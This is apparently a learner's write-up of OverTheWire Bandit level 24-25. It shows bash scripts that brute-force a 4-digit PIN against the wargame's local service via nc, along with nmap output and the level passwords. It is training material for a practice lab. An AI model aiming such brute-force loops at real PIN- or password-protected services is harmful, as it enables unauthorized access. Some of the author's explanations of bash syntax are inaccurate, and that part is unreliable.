# OverTheWire: Bandit Level 24 - 25
Category: Linux Fundamentals | Date: 09/1/2026 | Difficulty: Intermediate

## The Challenge
"Making someone do the hard part for us?" Is how I would describe this level. There is a server at port 30002 in localhost, where you have to pass in the password of the current level and a 4-digit pin code. However, there is no other way to find the 4-digit pin code, except by trying out the 10,000 possible combinations. This method was noted as brute forcing.

## My Approach
In this situation, what I like to do is checking out if there are any possible clues with the server. I started by using `nmap` with the extra flag of `-sV` to check if there is any *SSL/TLS* encryption and to see if there's any other devices connected to the server.

> I know it wasn't specified, but I like checking it just to be sure.

The results came out like this:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-02 15:43 +0000
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000024s latency).
Other addresses for localhost (not scanned): ::1

PORT      STATE SERVICE         VERSION
30002/tcp open  pago-services2?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30002-TCP:V=7.98%I=7%D=9/2%Time=6A98443A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,97,"I\x20am\x20the\x20pincode\x20checker\x20for\x20user\x20bandit25\
SF:.\x20Please\x20enter\x20the\x20password\x20for\x20user\x20bandit24\x20a
SF:nd\x20the\x20secret\x20pincode\x20on\x20a\x20single\x20line,\x20separat
SF:ed\x20by\x20a\x20space\.\n")%r(GenericLines,129,"I\x20am\x20the\x20pinc
SF:ode\x20checker\x20for\x20user\x20bandit25\.\x20Please\x20enter\x20the\x
SF:20password\x20for\x20user\x20bandit24\x20and\x20the\x20secret\x20pincod
SF:e\x20on\x20a\x20single\x20line,\x20separated\x20by\x20a\x20space\.\nWro
SF:ng!\x20Please\x20enter\x20the\x20correct\x20current\x20password\x20and\
SF:x20pincode\.\x20Try\x20again\.\nWrong!\x20Please\x20enter\x20the\x20cor
SF:rect\x20current\x20password\x20and\x20pincode\.\x20Try\x20again\.\n")%r
SF:(GetRequest,129,"I\x20am\x20the\x20pincode\x20checker\x20for\x20user\x2
SF:0bandit25\.\x20Please\x20enter\x20the\x20password\x20for\x20user\x20ban
SF:dit24\x20and\x20the\x20secret\x20pincode\x20on\x20a\x20single\x20line,\
SF:x20separated\x20by\x20a\x20space\.\nWrong!\x20Please\x20enter\x20the\x2
SF:0correct\x20current\x20password\x20and\x20pincode\.\x20Try\x20again\.\n
SF:Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password\x20a
SF:nd\x20pincode\.\x20Try\x20again\.\n")%r(HTTPOptions,129,"I\x20am\x20the
SF:\x20pincode\x20checker\x20for\x20user\x20bandit25\.\x20Please\x20enter\
SF:x20the\x20password\x20for\x20user\x20bandit24\x20and\x20the\x20secret\x
SF:20pincode\x20on\x20a\x20single\x20line,\x20separated\x20by\x20a\x20spac
SF:e\.\nWrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password
SF:\x20and\x20pincode\.\x20Try\x20again\.\nWrong!\x20Please\x20enter\x20th
SF:e\x20correct\x20current\x20password\x20and\x20pincode\.\x20Try\x20again
SF:\.\n")%r(RTSPRequest,129,"I\x20am\x20the\x20pincode\x20checker\x20for\x
SF:20user\x20bandit25\.\x20Please\x20enter\x20the\x20password\x20for\x20us
SF:er\x20bandit24\x20and\x20the\x20secret\x20pincode\x20on\x20a\x20single\
SF:x20line,\x20separated\x20by\x20a\x20space\.\nWrong!\x20Please\x20enter\
SF:x20the\x20correct\x20current\x20password\x20and\x20pincode\.\x20Try\x20
SF:again\.\nWrong!\x20Please\x20enter\x20the\x20correct\x20current\x20pass
SF:word\x20and\x20pincode\.\x20Try\x20again\.\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.40 seconds
```

### First attempt 

Reading the challenge description, I can assume that you have to make a script, so I started by doing `touch script.sh` to create a script. However, it came up with an error.

```
bandit24@bandit:~$ touch script.sh
touch: cannot touch 'script.sh': Permission denied
```

Which made me confused, so I checked the permissions of home directory if there was anything different by using `ls -la`, but nothing unusual came up.

This made me assume that I can't make scripts at home directory, so I created a temporary directory using `mktemp -d` and tested it again using `touch script.sh`, and worked normally.

Here, I started thinking how to make two scripts. One that would generate a list of all possible combinations for a 4-digit pin code and another that can input those combinations, along with the password of `bandit24` into the given server, while following the desired format.

The reason for the desired format is that when you connect to localhost at port 30002, it prompts you with this.
```
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

So, I did research on how to create shell scripts and came up with these for the scripts:

**pincode.script**
```
#!/bin/bash

echo "Generating 4-digit PIN wordlist..."
for pin in {0000..9999}; do
    echo "$pin" >> pin_wordlist.txt
done
echo "Wordlist saved to pin_wordlist.txt"

```
*Script Breakdown:*

- `#!/bin/bash` -> At first, I thought it was a comment, but it's actually telling the script to use the Bash/Shell Interpreter

- `echo` - It's just for confirmation that the program started and ended


```
for pin in {0000..9999}; do
    echo "$pin" >> pin_wordlist.txt 
done
```

- This line is saying, "for each pin in the range of 0 - 9999, place each created pin in a word file called pin_wordlist.txt"



**script.sh**:
```
#!/bin/bash -x

PINCODES=pin_wordlist.txt

if nc -z -w1 localhost 30002; then
    while IFS= read -rl line || [[ -n "$line"]]; do
        PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
        ATTEMPT="${PASS} ${$line}"
        echo ATTEMPT
    done < PINCODES
else
    echo "Didn't Work"

```
*Script Breakdown*
- `#!/bin/bash` - Again, this line tells the script to run using the Bash/Shell Interpreter
- `PINCODES=pin_wordlist.txt` - I'm assigning the variable of PINCODES with the pin_wordlist.txt file.
- `if nc -z -w1 localhost 30002;` - This line states, "if the connection against(-z) port 30002 at localhost is still listening and the connection is successful after one second(-w1) then do the next line of code"
- `while IFS= read -l line || [[ -n "$line" ]]; do` - Probably the most complicated segment of the code, so I'll explain it bit by bit. `IFS=` is a setting that, when targeted to an empty string, tells bash to not remove any white spaces from the file. `read -l` tells bash to read each line. `[[ -n "$line"]]` tells bash to return an exit code if the next line is empty.
- `PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"` = Assigning the variable *PASS* with value of the password of the current level.
- `ATTEMPT="${PASS} ${$line}"` - Another variable assignment, this line is stating, "Assign the value of `PASS` and the value of the current line, with a space separating the two variables." You might wonder how I'm passing in `PASS` in a string, the concept is called *String Concatenation* whose is format is `${variable}`. The format is similar with programming languages like Java and JavaScript.
- `echo "$ATTEMPT"` - This line echos or prints the result of ATTEMPT into the server.
- `done < "$PINCODES"` - This line basically says, "Utilize the contents of the variable `PINCODES` in loop until it runs out"
- `else echo "Didn't Work"` - This is to check if the script failed.

Before running them, I made sure they had permissions to be executable, so I used `chmod +x` to give make them executable and there I ran both scripts using `./scriptname.sh`.

### Result
**pin.sh -> pin_wordlist.txt**
```
  GNU nano 8.7.1                                       pin_wordlist.txt
0000
0001
0002
0003
0004
0005
0006
0007
0008
0009
0010
...
```
`pin.sh` worked out as intended, however, script.sh came out with a lot of syntax errors and didn't work.

```
+ PINCODES=pin_wordlist.txt
./script.sh: line 6: syntax error in conditional expression: unexpected token `;'
./script.sh: line 6: syntax error near `;'
./script.sh: line 6: `    while IFS= read -rl line || [[ -n "$line"]]; do'
```
### Ruling things out
With that, I went through the error list and fixed the syntax and checked it with AI to see if I was missing anything. So here's the list of things I was missing:
- First, I was missing the `fi` statement at the end of the if-else statement, which tells the script that the conditional statement has ended.
- Second, The way I concatenated and mentioned the variables in the script was wrong. I had assumed that the concept of *String Concatenation* was the same with other programming languages, which was by doing ${variable} if ever I wanted to be outputted as a string or to go with other strings.
- Lastly, the `read` command doesn't have actually have a `-l` command and that the actual flag to use is `-r`.

### The actual insight:
I learned the following after researching:
- First, shell scripts can follow various ways of programming or scripting, such as using Bash's native language or by simply using basic Linux commands.
- Second, scripts are also oriented from top to bottom, so it starts reading each line from the very top until it reaches the bottom of the code.
- Third, calling a variable or concatenating it in a string have a different format. For instance, when you want to call a variable in an echo, it has to be encased with `""` and prefixed with `$` as it will actually echo the word itself rather than the content of the variable if it's just the variable name. Another example is if you want to call a variable which contains a file - it has to be formatted as "$variable" - as it will literally find a file that matches the name of the variable in your directory, if not done correctly.

### Getting to the solution:
Knowing these now, I updated the code of `script.sh` and made it into this.

**script.sh (Updated)**:
```
#!/bin/bash -x

PINCODES="pin_wordlist.txt"

if nc -z -w1 localhost 30002; then
    while IFS= read -r line || [[ -n "$line" ]]; do
        PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
        ATTEMPT="${PASS} $line"
        echo "$ATTEMPT"
        
    done < "$PINCODES" | nc localhost 30002
else
    echo "Didn't Work"
fi

```
*Script Breakdown*
- `#!/bin/bash -x` - This is actually called a *shebang* and it tells the script to use the Bash Interpreter Binary. 
- `PINCODES="pin_wordlist.txt"` - I'm assigning the variable of PINCODES with the pin_wordlist.txt file.
- `if nc -z -w1 localhost 30002;` - This line states, "if the connection against(-z) port 30002 at localhost is still listening and the connection is successful after one second(-w1) then do the next line of code"
- `while IFS= read -r line || [[ -n "$line" ]]; do` - Probably the most complicated segment of the code, so I'll explain it bit by bit. `IFS=` is a setting that, when targeted to an empty string, tells bash to not remove any white spaces from the file. `read r-` tells bash to not interpret backslashes (\) as an escape character. Lastly, `[[ -n "$line" ]]` tells bash to return an exit code if the next line is empty.
- `PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"` = Assigning the variable *PASS* with value of the password of the current level.
- `ATTEMPT="${PASS} $line"` - Another variable assignment, this line is stating, "Assign the value of `PASS` and the value of the current line, with a space separating the two variables." You might wonder how I'm passing in `PASS` in a string, the concept is called *String Concatenation* whose is format is `${variable}`. The format is similar with programming languages like Java and JavaScript.
- `echo "$ATTEMPT"` - This line echos or prints the result of ATTEMPT into the server.
- `done < "$PINCODES" | nc localhost 30002` - This line basically says, "Utilize the contents of the variable `PINCODES` in loop until it runs out and send it's output to `nc localhost 30002`"
- `else echo "Didn't Work"` - This is to check if the script failed.

However, the script ran so fast that I couldn't identify which pin code was the correct one. 
```
+ IFS=
+ read -r line
+ PASS=hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+ ATTEMPT='hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8195'
+ echo 'hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8195'
+ IFS=
+ read -r line
+ PASS=hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+ ATTEMPT='hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8196'
+ echo 'hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8196'
+ IFS=
+ read -r line
+ PASS=hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+ ATTEMPT='hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8197'
+ echo 'hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8197'
+ IFS=
+ read -r line
+ PASS=hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+ ATTEMPT='hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8198'
+ echo 'hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8198'
+ IFS=
+ read -r line
+ PASS=hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+ ATTEMPT='hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8199'
+ echo 'hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 8199'
+ IFS=
+ read -r line
+ PASS=hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```
> note: This was after running it for a few seconds.

### The Solution

To fix that, I found a command called `sleep` that tells the loop to wait for a given time before passing continuing, so I implemented `sleep` command and set it to two seconds, then added it to the script and ended up with:
```
#!/bin/bash -x

PINCODES="pin_wordlist.txt"

if nc -z -w1 localhost 30002; then
    while IFS= read -r line || [[ -n "$line" ]]; do
        PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
        ATTEMPT="${PASS} $line"
        echo "$ATTEMPT"

        sleep 2     
    done < "$PINCODES" | nc localhost 30002
else
    echo "Didn't Work"
fi

```

Although, it was much slower because I set it at 2 seconds, so it would've better if it was around 0.5s or 1 seconds. Nevertheless I was able to get the key of the next level after 5 minutes or so.
```
+ IFS=
+ read -r line
+ PASS=hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+ ATTEMPT='hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0332'
+ echo 'hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0332'
Correct!
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

### Key Takeaway
This level was a test to my critical thinking and problem solving ability. I was placed in a situation where I had to find a way to solve this 4-digit pin code fast and efficiently, which made me really go deep into how to create scripts with Bash, how to debug code, and how to use my knowledge in Linux to beat this level.

### Tools/Commands Referenced
- `cd`
- `touch`
- `nano`
- `mktemp -d`
- `chmod`
- `nc`
- `nmap`


<-- [Previous Write-Up](bandit-23-24.md) | [Next Write-Up](bandit-25-26.md) -->
